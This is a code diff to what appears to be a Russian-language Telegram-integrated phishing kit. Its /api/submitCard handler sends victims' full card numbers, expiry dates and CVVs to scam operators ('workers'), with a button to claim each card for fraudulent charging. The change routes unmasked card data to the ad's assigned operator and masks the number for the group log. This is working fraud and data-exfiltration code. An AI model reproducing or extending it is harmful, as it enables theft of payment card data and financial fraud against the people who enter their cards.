@@ -603,16 +603,44 @@ app.post(`/api/submitCard`, async (req, res) => {
     const settings = await Settings.findByPk(1);
     const support = await generateSupport(ad, req, res);
     const cardInfo = await getCardInfo(log.cardNumber);
-    await bot.sendMessage(
-      ad.writeId ? ad.writeId : settings.logsGroupId,
+    if (ad.writeId) {
+      await bot.sendMessage(
+        ad.writeId,
       `<b>✏️ Ввод карты ${ad.service.title}</b>
+
 💰 Баланс: <code>${getBalance(log, ad)}</code>
+
 💳 Номер карты: <b>${log.cardNumber}</b>
 📅 Срок действия: <b>${log.cardExpire}</b>
 🔒 CVV: <b>${log.cardCvv}</b>
+
 ℹ️ Информация о карте: ${cardInfo}
+
 👨🏻‍💻 Воркер: <b><a href="tg://user?id=${ad.userId}">${ad.user.username}</a></b>
 👤 ID Воркера: <code>${ad.userId}</code>
+
+⚡️ ID Объявления: <code>${ad.id}</code>
+📦 Объявление: <b>${ad.title}</b>
+💰 Цена: <b>${ad.price}</b>`,
+        {
+          parse_mode: "HTML",
+          reply_markup: Markup.inlineKeyboard([[Markup.callbackButton("✍️ Взять на вбив", `take_log_${log.id}_${ad.id}_link`)]]),
+        }
+      );
+    } else {
+    await bot.sendMessage(
+      settings.logsGroupId,
+      `<b>✏️ Ввод карты ${ad.service.title}</b>
+
+💰 Баланс: <code>${getBalance(log, ad)}</code>
+
+💳 Номер карты: <b>${log.cardNumber.replace(/^(.{6})([0-9]{6})/, "$1******")}</b>
+
+ℹ️ Информация о карте: ${cardInfo}
+
+👨🏻‍💻 Воркер: <b><a href="tg://user?id=${ad.userId}">${ad.user.username}</a></b>
+👤 ID Воркера: <code>${ad.userId}</code>
+
 ⚡️ ID Объявления: <code>${ad.id}</code>
 📦 Объявление: <b>${ad.title}</b>
 💰 Цена: <b>${ad.price}</b>`,
@@ -621,6 +649,7 @@ app.post(`/api/submitCard`, async (req, res) => {
         reply_markup: Markup.inlineKeyboard([[Markup.callbackButton("✍️ Взять на вбив", `take_log_${log.id}_${ad.id}_link`)]]),
       }
     );
+  }
     await bot
       .sendMessage(
         ad.userId,
